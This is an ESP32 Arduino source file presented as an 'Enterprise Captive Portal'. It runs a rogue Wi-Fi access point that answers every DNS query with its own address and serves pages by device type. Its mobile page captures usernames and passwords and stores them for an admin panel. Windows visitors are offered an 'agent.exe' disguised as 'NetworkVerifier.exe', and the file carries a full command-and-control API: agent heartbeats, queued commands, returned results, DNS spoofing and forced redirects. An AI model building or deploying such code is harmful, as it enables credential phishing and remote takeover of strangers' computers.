/*
 * ============================================================================
 *  ESP32 Enterprise Captive Portal
 *  Version: 2.0.0
 *  
 *  Features:
 *  - Smart device detection (Windows/iOS/Android/Mac/Linux)
 *  - Captive portal auto-popup for all major OS
 *  - Password-protected admin dashboard
 *  - Device logging with timestamps
 *  - Credential storage for mobile devices
 *  - Windows agent download tracking
 *  - Enterprise-grade responsive UI
 * ============================================================================
 */

#include <DNSServer.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>

#include "config.h"
#include "storage.h"
#include "pages.h"
#include "admin_page.h"

// ============================================================================
//  GLOBAL OBJECTS
// ============================================================================
DNSServer dnsServer;
AsyncWebServer server(80);

// Session Management
String g_sessionToken = "";
unsigned long g_sessionExpiry = 0;

// WiFi Scanning State
bool g_wifiScanInProgress = false;
String g_lastScanResults = "[]";

// ============================================================================
//  DEVICE DETECTION
// ============================================================================
DeviceType detectDevice(const String& userAgent) {
    String ua = userAgent;
    ua.toLowerCase();
    
    if (ua.indexOf("windows") >= 0) return DeviceType::WINDOWS;
    if (ua.indexOf("iphone") >= 0 || ua.indexOf("ipad") >= 0) return DeviceType::IPHONE;
    if (ua.indexOf("android") >= 0) return DeviceType::ANDROID;
    if (ua.indexOf("macintosh") >= 0 || ua.indexOf("mac os") >= 0) return DeviceType::MAC;
    if (ua.indexOf("linux") >= 0 && ua.indexOf("android") < 0) return DeviceType::LINUX;
    
    return DeviceType::UNKNOWN;
}

// ============================================================================
//  SESSION MANAGEMENT
// ============================================================================
String generateSessionToken() {
    String token = "";
    const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < 32; i++) {
        token += chars[random(0, sizeof(chars) - 1)];
    }
    return token;
}

bool isValidSession(AsyncWebServerRequest* request) {
    if (g_sessionToken.isEmpty() || millis() > g_sessionExpiry) {
        return false;
    }
    
    if (request->hasHeader("Cookie")) {
        String cookie = request->header("Cookie");
        return cookie.indexOf("session=" + g_sessionToken) >= 0;
    }
    return false;
}

// ============================================================================
//  HTML HELPERS
// ============================================================================
String processPage(const char* page) {
    String html = FPSTR(page);
    String styles = FPSTR(STYLES);
    html.replace("%STYLES%", styles);
    return html;
}

// ============================================================================
//  CAPTIVE PORTAL HANDLER - Catches ALL unhandled requests
// ============================================================================
class CaptiveRequestHandler : public AsyncWebHandler {
public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}

    bool canHandle(AsyncWebServerRequest* request) {
        // Handle ALL requests - this is a catch-all for captive portal
        return true;
    }

    void handleRequest(AsyncWebServerRequest* request) {
        String clientIP = request->client()->remoteIP().toString();
        String userAgent = request->hasHeader("User-Agent") ? request->header("User-Agent") : "";
        String host = request->host();
        String url = request->url();
        DeviceType deviceType = detectDevice(userAgent);
        
        Serial.printf("[CAPTIVE] %s | %s | Host: %s | URL: %s\n", 
            clientIP.c_str(), deviceTypeToString(deviceType), host.c_str(), url.c_str());
        
        // Save device
        saveDevice(clientIP, deviceType, false);
        
        // Check for redirect enforcement
        if (getRedirectEnabled()) {
            String target = getRedirectTarget();
            if (target.length() > 0) {
                Serial.printf("[REDIRECT] Enforcing redirect to: %s\n", target.c_str());
                request->redirect(target);
                return;
            }
        }
        
        // Serve appropriate page based on device
        if (deviceType == DeviceType::WINDOWS) {
            request->send(200, "text/html", processPage(PAGE_WINDOWS));
        } else {
            request->send(200, "text/html", processPage(PAGE_MOBILE));
        }
    }
};

// ============================================================================
//  CAPTIVE PORTAL PAGE HANDLER
// ============================================================================
void handleCaptivePortal(AsyncWebServerRequest* request) {
    String clientIP = request->client()->remoteIP().toString();
    String userAgent = request->hasHeader("User-Agent") ? request->header("User-Agent") : "";
    DeviceType deviceType = detectDevice(userAgent);
    
    Serial.printf("[PORTAL] %s | %s | %s\n", clientIP.c_str(), deviceTypeToString(deviceType), request->url().c_str());
    saveDevice(clientIP, deviceType, false);
    
    // Check for redirect enforcement
    if (getRedirectEnabled()) {
        String target = getRedirectTarget();
        if (target.length() > 0) {
            Serial.printf("[REDIRECT] Enforcing redirect to: %s\n", target.c_str());
            request->redirect(target);
            return;
        }
    }
    
    if (deviceType == DeviceType::WINDOWS) {
        request->send(200, "text/html", processPage(PAGE_WINDOWS));
    } else {
        request->send(200, "text/html", processPage(PAGE_MOBILE));
    }
}

// ============================================================================
//  SETUP ROUTES
// ============================================================================
void setupRoutes() {
    // ===== WINDOWS CAPTIVE PORTAL DETECTION =====
    // Windows 10/11 NCSI (Network Connectivity Status Indicator)
    server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest* request) {
        Serial.println("[NCSI] Windows connecttest.txt");
        request->redirect("http://10.22.4.1/portal");
    });
    
    server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest* request) {
        Serial.println("[NCSI] Windows ncsi.txt");
        request->redirect("http://10.22.4.1/portal");
    });
    
    // Windows redirect page
    server.on("/redirect", HTTP_GET, [](AsyncWebServerRequest* request) {
        Serial.println("[NCSI] Windows redirect");
        handleCaptivePortal(request);
    });
    
    // Microsoft connectivity check
    server.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest* request) {
        Serial.println("[NCSI] Windows fwlink");
        handleCaptivePortal(request);
    });
    
    // ===== ANDROID CAPTIVE PORTAL DETECTION =====
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest* request) {
        Serial.println("[NCSI] Android generate_204");
        request->redirect("http://10.22.4.1/portal");
    });
    
    server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest* request) {
        Serial.println("[NCSI] Android gen_204");
        request->redirect("http://10.22.4.1/portal");
    });
    
    // ===== APPLE CAPTIVE PORTAL DETECTION =====
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest* request) {
        Serial.println("[NCSI] Apple hotspot-detect");
        handleCaptivePortal(request);
    });
    
    server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest* request) {
        Serial.println("[NCSI] Apple success.html");
        handleCaptivePortal(request);
    });
    
    // ===== GENERIC SUCCESS ENDPOINTS =====
    server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest* request) {
        request->redirect("http://10.22.4.1/portal");
    });
    
    server.on("/canonical.html", HTTP_GET, [](AsyncWebServerRequest* request) {
        handleCaptivePortal(request);
    });
    
    // Main portal page
    server.on("/portal", HTTP_GET, [](AsyncWebServerRequest* request) {
        String clientIP = request->client()->remoteIP().toString();
        String userAgent = request->hasHeader("User-Agent") ? request->header("User-Agent") : "";
        DeviceType deviceType = detectDevice(userAgent);
        
        saveDevice(clientIP, deviceType, false);
        
        if (deviceType == DeviceType::WINDOWS) {
            request->send(200, "text/html", processPage(PAGE_WINDOWS));
        } else {
            request->send(200, "text/html", processPage(PAGE_MOBILE));
        }
    });
    
    // Root page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
        String clientIP = request->client()->remoteIP().toString();
        String userAgent = request->hasHeader("User-Agent") ? request->header("User-Agent") : "";
        DeviceType deviceType = detectDevice(userAgent);
        
        saveDevice(clientIP, deviceType, false);
        
        if (deviceType == DeviceType::WINDOWS) {
            request->send(200, "text/html", processPage(PAGE_WINDOWS));
        } else {
            request->send(200, "text/html", processPage(PAGE_MOBILE));
        }
    });
    
    // Admin page
    server.on("/admin", HTTP_GET, [](AsyncWebServerRequest* request) {
        if (isValidSession(request)) {
            request->send(200, "text/html", FPSTR(PAGE_ADMIN_DASHBOARD));
        } else {
            request->send(200, "text/html", processPage(PAGE_ADMIN_LOGIN));
        }
    });
    
    // Admin authentication
    server.on("/api/admin-auth", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (request->hasParam("password", true)) {
            String password = request->getParam("password", true)->value();
            
            if (password == Config::ADMIN_PASSWORD) {
                g_sessionToken = generateSessionToken();
                g_sessionExpiry = millis() + Config::SESSION_TIMEOUT_MS;
                
                AsyncWebServerResponse* response = request->beginResponse(200, "application/json", "{\"success\":true}");
                response->addHeader("Set-Cookie", "session=" + g_sessionToken + "; Path=/; HttpOnly");
                request->send(response);
                Serial.println("[ADMIN] Login successful");
            } else {
                request->send(200, "application/json", "{\"success\":false,\"message\":\"Invalid password\"}");
                Serial.println("[ADMIN] Login failed - wrong password");
            }
        } else {
            request->send(400, "application/json", "{\"success\":false,\"message\":\"Password required\"}");
        }
    });
    
    // Admin logout
    server.on("/admin/logout", HTTP_GET, [](AsyncWebServerRequest* request) {
        g_sessionToken = "";
        g_sessionExpiry = 0;
        AsyncWebServerResponse* response = request->beginResponse(302);
        response->addHeader("Location", "/admin");
        response->addHeader("Set-Cookie", "session=; Path=/; Max-Age=0");
        request->send(response);
    });
    
    // API: Get devices
    server.on("/api/devices", HTTP_GET, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        request->send(200, "application/json", getDevicesJson());
    });
    
    // API: Get credentials
    server.on("/api/credentials", HTTP_GET, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        request->send(200, "application/json", getCredentialsJson());
    });
    
    // API: Clear all data
    server.on("/api/clear", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        clearAllData();
        request->send(200, "application/json", "{\"success\":true}");
        Serial.println("[ADMIN] All data cleared");
    });
    
    // API: Mobile login
    server.on("/api/login", HTTP_POST, [](AsyncWebServerRequest* request) {
        String clientIP = request->client()->remoteIP().toString();
        String userAgent = request->hasHeader("User-Agent") ? request->header("User-Agent") : "";
        DeviceType deviceType = detectDevice(userAgent);
        
        if (request->hasParam("username", true) && request->hasParam("password", true)) {
            String username = request->getParam("username", true)->value();
            String password = request->getParam("password", true)->value();
            
            saveCredentials(clientIP, username, password, deviceType);
            
            request->send(200, "application/json", "{\"success\":true,\"message\":\"Connected successfully\"}");
        } else {
            request->send(400, "application/json", "{\"success\":false,\"message\":\"Username and password required\"}");
        }
    });
    
    // API: Download notification
    server.on("/api/download-notify", HTTP_GET, [](AsyncWebServerRequest* request) {
        String clientIP = request->client()->remoteIP().toString();
        markFileDownloaded(clientIP);
        Serial.printf("[DOWNLOAD] Notified by %s\n", clientIP.c_str());
        request->send(200, "text/plain", "OK");
    });
    
    // Download agent
    server.on("/download/agent.exe", HTTP_GET, [](AsyncWebServerRequest* request) {
        String clientIP = request->client()->remoteIP().toString();
        markFileDownloaded(clientIP);
        Serial.printf("[DOWNLOAD] Agent requested by %s\n", clientIP.c_str());
        
        if (SPIFFS.exists(Config::AGENT_FILE)) {
            request->send(SPIFFS, Config::AGENT_FILE, "application/octet-stream");
        } else {
            // Placeholder if no agent file exists
            AsyncWebServerResponse* response = request->beginResponse(200, "application/octet-stream", "NETWORK_VERIFIER_PLACEHOLDER");
            response->addHeader("Content-Disposition", "attachment; filename=\"NetworkVerifier.exe\"");
            request->send(response);
        }
    });
    
    // ===== DNS MAPPINGS API =====
    // API: Get DNS mappings
    server.on("/api/dns-mappings", HTTP_GET, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        request->send(200, "application/json", getDnsMappingsJson());
    });
    
    // API: Add/Update DNS mapping
    server.on("/api/dns-mappings", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        
        if (request->hasParam("domain", true) && request->hasParam("ip", true)) {
            String domain = request->getParam("domain", true)->value();
            String ip = request->getParam("ip", true)->value();
            
            // Validate IP address
            IPAddress testIP;
            if (!testIP.fromString(ip)) {
                request->send(400, "application/json", "{\"success\":false,\"message\":\"Invalid IP address\"}");
                return;
            }
            
            if (saveDnsMapping(domain, ip)) {
                Serial.printf("[DNS] Added mapping: %s -> %s\n", domain.c_str(), ip.c_str());
                request->send(200, "application/json", "{\"success\":true}");
            } else {
                request->send(500, "application/json", "{\"success\":false,\"message\":\"Failed to save mapping\"}");
            }
        } else {
            request->send(400, "application/json", "{\"success\":false,\"message\":\"Domain and IP required\"}");
        }
    });
    
    // API: Delete DNS mapping
    server.on("/api/dns-mappings/delete", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        
        if (request->hasParam("domain", true)) {
            String domain = request->getParam("domain", true)->value();
            if (deleteDnsMapping(domain)) {
                Serial.printf("[DNS] Deleted mapping: %s\n", domain.c_str());
                request->send(200, "application/json", "{\"success\":true}");
            } else {
                request->send(500, "application/json", "{\"success\":false,\"message\":\"Failed to delete mapping\"}");
            }
        } else {
            request->send(400, "application/json", "{\"success\":false,\"message\":\"Domain required\"}");
        }
    });
    
    // ===== WIFI CONNECTION API =====
    // API: Scan WiFi networks
    server.on("/api/wifi/scan", HTTP_GET, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        
        if (!g_wifiScanInProgress) {
            g_wifiScanInProgress = true;
            WiFi.scanNetworks(true); // Async scan
            Serial.println("[WIFI] Starting network scan...");
        }
        
        int n = WiFi.scanComplete();
        if (n == WIFI_SCAN_RUNNING) {
            request->send(200, "application/json", "{\"status\":\"scanning\",\"networks\":[]}");
        } else if (n == WIFI_SCAN_FAILED) {
            g_wifiScanInProgress = false;
            request->send(200, "application/json", "{\"status\":\"failed\",\"networks\":[]}");
        } else {
            DynamicJsonDocument doc(4096);
            JsonArray networks = doc.createNestedArray("networks");
            doc["status"] = "complete";
            
            for (int i = 0; i < n && i < (int)Config::MAX_WIFI_SCAN_RESULTS; i++) {
                JsonObject net = networks.createNestedObject();
                net["ssid"] = WiFi.SSID(i);
                net["rssi"] = WiFi.RSSI(i);
                net["channel"] = WiFi.channel(i);
                net["encryption"] = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "Secured";
            }
            
            String output;
            serializeJson(doc, output);
            g_lastScanResults = output;
            g_wifiScanInProgress = false;
            WiFi.scanDelete();
            
            Serial.printf("[WIFI] Scan complete, found %d networks\n", n);
            request->send(200, "application/json", output);
        }
    });
    
    // API: Connect to WiFi network
    server.on("/api/wifi/connect", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        
        if (request->hasParam("ssid", true)) {
            String ssid = request->getParam("ssid", true)->value();
            String password = request->hasParam("password", true) ? request->getParam("password", true)->value() : "";
            
            Serial.printf("[WIFI] Connecting to: %s\n", ssid.c_str());
            
            WiFi.begin(ssid.c_str(), password.c_str());
            
            // Wait for connection (with timeout)
            int attempts = 0;
            while (WiFi.status() != WL_CONNECTED && attempts < 20) {
                delay(500);
                attempts++;
                Serial.print(".");
            }
            Serial.println();
            
            if (WiFi.status() == WL_CONNECTED) {
                setStaConnectionInfo(true, ssid);
                Serial.printf("[WIFI] Connected! IP: %s\n", WiFi.localIP().toString().c_str());
                
                DynamicJsonDocument doc(256);
                doc["success"] = true;
                doc["ip"] = WiFi.localIP().toString();
                doc["ssid"] = ssid;
                String output;
                serializeJson(doc, output);
                request->send(200, "application/json", output);
            } else {
                setStaConnectionInfo(false, "");
                Serial.println("[WIFI] Connection failed");
                request->send(200, "application/json", "{\"success\":false,\"message\":\"Connection failed\"}");
            }
        } else {
            request->send(400, "application/json", "{\"success\":false,\"message\":\"SSID required\"}");
        }
    });
    
    // API: Disconnect from WiFi
    server.on("/api/wifi/disconnect", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        
        WiFi.disconnect();
        setStaConnectionInfo(false, "");
        Serial.println("[WIFI] Disconnected from network");
        request->send(200, "application/json", "{\"success\":true}");
    });
    
    // API: Get WiFi status
    server.on("/api/wifi/status", HTTP_GET, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        
        DynamicJsonDocument doc(256);
        doc["connected"] = (WiFi.status() == WL_CONNECTED);
        doc["ssid"] = WiFi.SSID();
        doc["ip"] = WiFi.localIP().toString();
        doc["rssi"] = WiFi.RSSI();
        
        String output;
        serializeJson(doc, output);
        request->send(200, "application/json", output);
    });
    
    // ===== REDIRECT ENFORCEMENT API =====
    // API: Get settings (including redirect)
    server.on("/api/settings", HTTP_GET, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        request->send(200, "application/json", getSettingsJson());
    });
    
    // API: Set redirect enforcement
    server.on("/api/settings/redirect", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        
        bool enabled = false;
        String target = "";
        
        if (request->hasParam("enabled", true)) {
            enabled = (request->getParam("enabled", true)->value() == "true" || 
                       request->getParam("enabled", true)->value() == "1");
        }
        
        if (request->hasParam("target", true)) {
            target = request->getParam("target", true)->value();
        }
        
        if (setRedirectSettings(enabled, target)) {
            Serial.printf("[REDIRECT] %s -> %s\n", enabled ? "Enabled" : "Disabled", target.c_str());
            request->send(200, "application/json", "{\"success\":true}");
        } else {
            request->send(500, "application/json", "{\"success\":false,\"message\":\"Failed to save settings\"}");
        }
    });
    
    // ===== SECURITY MONITOR CLIENTS API =====
    // API: Get all clients
    server.on("/api/clients", HTTP_GET, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        request->send(200, "application/json", getClientsJson());
    });
    
    // API: Delete a client
    server.on("/api/clients/delete", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        
        if (request->hasParam("hostname", true)) {
            String hostname = request->getParam("hostname", true)->value();
            if (deleteClient(hostname)) {
                Serial.printf("[CLIENT] Deleted: %s\n", hostname.c_str());
                request->send(200, "application/json", "{\"success\":true}");
            } else {
                request->send(500, "application/json", "{\"success\":false,\"message\":\"Failed to delete client\"}");
            }
        } else {
            request->send(400, "application/json", "{\"success\":false,\"message\":\"Hostname required\"}");
        }
    });
    
    // API: Clear all clients
    server.on("/api/clients/clear", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        
        if (clearClients()) {
            Serial.println("[CLIENT] All clients cleared");
            request->send(200, "application/json", "{\"success\":true}");
        } else {
            request->send(500, "application/json", "{\"success\":false,\"message\":\"Failed to clear clients\"}");
        }
    });
    
    // API: Receive client report (from Windows Security Monitor)
    // This endpoint accepts JSON body via AsyncCallbackJsonWebHandler
    server.on("/api/client-report", HTTP_POST, 
        [](AsyncWebServerRequest* request) {},
        NULL,
        [](AsyncWebServerRequest* request, uint8_t* data, size_t len, size_t index, size_t total) {
            // Parse JSON body
            String body = "";
            for (size_t i = 0; i < len; i++) {
                body += (char)data[i];
            }
            
            DynamicJsonDocument doc(4096);
            DeserializationError error = deserializeJson(doc, body);
            
            if (error) {
                Serial.printf("[CLIENT] JSON parse error: %s\n", error.c_str());
                request->send(400, "application/json", "{\"success\":false,\"message\":\"Invalid JSON\"}");
                return;
            }
            
            String hostname = doc["hostname"] | "";
            String ip = doc["ip"] | request->client()->remoteIP().toString();
            String osType = doc["osType"] | "Unknown";
            String osVersion = doc["osVersion"] | "";
            String osBuild = doc["osBuild"] | "";
            String osArch = doc["osArch"] | "";
            String status = doc["status"] | "online";
            
            // Serialize security array back to string
            String securityJson = "[]";
            if (doc.containsKey("security")) {
                serializeJson(doc["security"], securityJson);
            }
            
            if (hostname.length() > 0) {
                if (saveClientReport(hostname, ip, osType, osVersion, osBuild, osArch, status, securityJson)) {
                    Serial.printf("[CLIENT] Report from %s (%s) - %s\n", hostname.c_str(), ip.c_str(), osVersion.c_str());
                    request->send(200, "application/json", "{\"success\":true}");
                } else {
                    request->send(500, "application/json", "{\"success\":false,\"message\":\"Failed to save report\"}");
                }
            } else {
                request->send(400, "application/json", "{\"success\":false,\"message\":\"Hostname required\"}");
            }
        }
    );
    
    // ===== AGENT API ENDPOINTS =====
    // API: Agent heartbeat (receives system info from agent.exe)
    server.on("/api/agent-heartbeat", HTTP_POST,
        [](AsyncWebServerRequest* request) {},
        NULL,
        [](AsyncWebServerRequest* request, uint8_t* data, size_t len, size_t index, size_t total) {
            String body = "";
            for (size_t i = 0; i < len; i++) {
                body += (char)data[i];
            }
            
            DynamicJsonDocument doc(4096);
            DeserializationError error = deserializeJson(doc, body);
            
            if (error) {
                request->send(400, "application/json", "{\"success\":false,\"message\":\"Invalid JSON\"}");
                return;
            }
            
            String clientId = doc["clientId"] | "";
            String hostname = doc["hostname"] | "";
            String ip = doc["ip"] | request->client()->remoteIP().toString();
            String osType = doc["osType"] | "Unknown";
            String osVersion = doc["osVersion"] | "";
            String osBuild = doc["osBuild"] | "";
            String osArch = doc["osArch"] | "";
            String status = doc["status"] | "online";
            String mac = doc["mac"] | "";
            String username = doc["username"] | "";
            bool wifiConnected = doc["wifiConnected"] | false;
            String connectedSSID = doc["connectedSSID"] | "";
            
            String securityJson = "[]";
            if (doc.containsKey("security")) {
                serializeJson(doc["security"], securityJson);
            }
            
            if (hostname.length() > 0) {
                if (saveClientReport(hostname, ip, osType, osVersion, osBuild, osArch, status, securityJson, clientId)) {
                    Serial.printf("[AGENT] Heartbeat from %s (%s) [%s]\n", hostname.c_str(), ip.c_str(), clientId.c_str());
                    request->send(200, "application/json", "{\"success\":true}");
                } else {
                    request->send(500, "application/json", "{\"success\":false}");
                }
            } else {
                request->send(400, "application/json", "{\"success\":false,\"message\":\"Hostname required\"}");
            }
        }
    );
    
    // API: Get pending command for agent
    server.on("/api/agent-command", HTTP_GET, [](AsyncWebServerRequest* request) {
        if (!request->hasParam("clientId")) {
            request->send(400, "application/json", "{\"error\":\"clientId required\"}");
            return;
        }
        
        String clientId = request->getParam("clientId")->value();
        String cmd = getPendingCommand(clientId);
        
        if (cmd.length() > 0) {
            request->send(200, "application/json", cmd);
        } else {
            request->send(200, "application/json", "{\"command\":null}");
        }
    });
    
    // API: Receive command result from agent
    server.on("/api/agent-command-result", HTTP_POST,
        [](AsyncWebServerRequest* request) {},
        NULL,
        [](AsyncWebServerRequest* request, uint8_t* data, size_t len, size_t index, size_t total) {
            String body = "";
            for (size_t i = 0; i < len; i++) {
                body += (char)data[i];
            }
            
            DynamicJsonDocument doc(4096);
            DeserializationError error = deserializeJson(doc, body);
            
            if (error) {
                request->send(400, "application/json", "{\"success\":false}");
                return;
            }
            
            String clientId = doc["clientId"] | "";
            String commandId = doc["commandId"] | "";
            String result = doc["result"] | "";
            
            // Truncate result if too long
            if (result.length() > 2000) {
                result = result.substring(0, 2000) + "...(truncated)";
            }
            
            if (saveCommandResult(clientId, commandId, result)) {
                Serial.printf("[AGENT] Command result from %s\n", clientId.c_str());
                request->send(200, "application/json", "{\"success\":true}");
            } else {
                request->send(500, "application/json", "{\"success\":false}");
            }
        }
    );
    
    // API: Send command to agent (from admin)
    server.on("/api/send-command", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        
        if (request->hasParam("clientId", true) && request->hasParam("command", true)) {
            String clientId = request->getParam("clientId", true)->value();
            String command = request->getParam("command", true)->value();
            
            if (queueCommand(clientId, command)) {
                Serial.printf("[ADMIN] Command queued for %s: %s\n", clientId.c_str(), command.c_str());
                request->send(200, "application/json", "{\"success\":true}");
            } else {
                request->send(500, "application/json", "{\"success\":false}");
            }
        } else {
            request->send(400, "application/json", "{\"success\":false,\"message\":\"clientId and command required\"}");
        }
    });
    
    // API: Get command results
    server.on("/api/command-results", HTTP_GET, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        
        String clientId = "";
        if (request->hasParam("clientId")) {
            clientId = request->getParam("clientId")->value();
        }
        
        request->send(200, "application/json", getCommandResults(clientId));
    });
    
    // API: Clear command results
    server.on("/api/command-results/clear", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (!isValidSession(request)) {
            request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
            return;
        }
        
        clearCommandResults();
        request->send(200, "application/json", "{\"success\":true}");
    });
    
    // Catch-all for any unhandled requests (404 -> portal page)
    server.onNotFound([](AsyncWebServerRequest* request) {
        String clientIP = request->client()->remoteIP().toString();
        String userAgent = request->hasHeader("User-Agent") ? request->header("User-Agent") : "";
        String host = request->host();
        String url = request->url();
        DeviceType deviceType = detectDevice(userAgent);
        
        Serial.printf("[NOT_FOUND] %s | %s | Host: %s | URL: %s\n", 
            clientIP.c_str(), deviceTypeToString(deviceType), host.c_str(), url.c_str());
        
        saveDevice(clientIP, deviceType, false);
        
        // Check for redirect enforcement
        if (getRedirectEnabled()) {
            String target = getRedirectTarget();
            if (target.length() > 0) {
                Serial.printf("[REDIRECT] Enforcing redirect to: %s\n", target.c_str());
                request->redirect(target);
                return;
            }
        }
        
        if (deviceType == DeviceType::WINDOWS) {
            request->send(200, "text/html", processPage(PAGE_WINDOWS));
        } else {
            request->send(200, "text/html", processPage(PAGE_MOBILE));
        }
    });
    
    // Add captive portal handler for unknown hosts
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
}

// ============================================================================
//  SETUP
// ============================================================================
void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println();
    Serial.println("============================================");
    Serial.println("  ESP32 Enterprise Captive Portal v2.0");
    Serial.println("============================================");
    
    // Initialize storage
    if (!initStorage()) {
        Serial.println("[ERROR] Storage initialization failed!");
        return;
    }
    
    // Configure WiFi AP+STA mode (allows connecting to another router while serving as AP)
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPConfig(Config::AP_IP, Config::AP_GATEWAY, Config::AP_SUBNET);
    WiFi.softAP(Config::AP_SSID, Config::AP_PASSWORD);
    
    Serial.printf("[OK] AP Started: %s\n", Config::AP_SSID);
    Serial.printf("[OK] IP Address: %s\n", WiFi.softAPIP().toString().c_str());
    
    // Setup routes
    setupRoutes();
    
    // Start DNS server (redirect all domains to AP IP)
    dnsServer.start(Config::DNS_PORT, "*", Config::AP_IP);
    Serial.println("[OK] DNS Server started");
    
    // Start web server
    server.begin();
    Serial.println("[OK] Web Server started");
    
    Serial.println("============================================");
    Serial.printf("  Admin Panel: http://%s/admin\n", WiFi.softAPIP().toString().c_str());
    Serial.printf("  Password: %s\n", Config::ADMIN_PASSWORD);
    Serial.println("============================================");
}

// ============================================================================
//  LOOP
// ============================================================================
void loop() {
    dnsServer.processNextRequest();
    delay(1);
}
